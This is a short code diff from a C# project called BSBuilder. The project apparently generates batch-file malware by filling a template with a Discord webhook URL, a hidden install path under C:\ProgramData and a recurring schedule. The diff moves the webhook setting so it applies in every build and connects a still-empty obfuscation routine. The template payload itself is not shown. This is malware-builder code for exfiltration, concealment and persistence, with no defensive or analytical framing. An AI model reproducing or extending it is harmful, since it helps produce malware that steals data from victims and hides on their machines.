@@ -218,6 +218,11 @@ namespace BSBuilder
             batch = batch.Replace(original, newcurl);
         }
 
+        void obfuscatebatch(string batchsource, int pass)
+        {
+            //Todo
+        }
+
         private void buildbutton_Click(object sender, EventArgs e)
         {
             if (forcerestart)
@@ -330,12 +335,13 @@ namespace BSBuilder
                         batch = Regex.Replace(batch, @"^\s*$\n|\r", string.Empty, RegexOptions.Multiline);
                     }
 
+                    if (webhook.Length != 0)
+                        editVAR("set \"webhook=https://discord.com/api/webhooks/\"", "webhook", webhook);
+
                     if (recurring)
                     {
                         removeGOTO("goto skiprecurring");
 
-                        if (webhook.Length != 0)
-                            editVAR("set \"webhook=https://discord.com/api/webhooks/\"", "webhook", webhook);
                         if (hidepath.Length != 0)
                             editVAR("set \"vpath=C:\\ProgramData\"", "vpath", hidepath);
                         if (whenscheduled.Length != 0)
@@ -357,9 +363,7 @@ namespace BSBuilder
                         removeFUNCTION("goto skiprecurring");
 
                     if (obfuscate)
-                    {
-                        //todo
-                    }
+                        obfuscatebatch(batch, 1);
 
                     using (StreamWriter wt = new StreamWriter(AppDomain.CurrentDomain.BaseDirectory + "output.bat"))
                     {
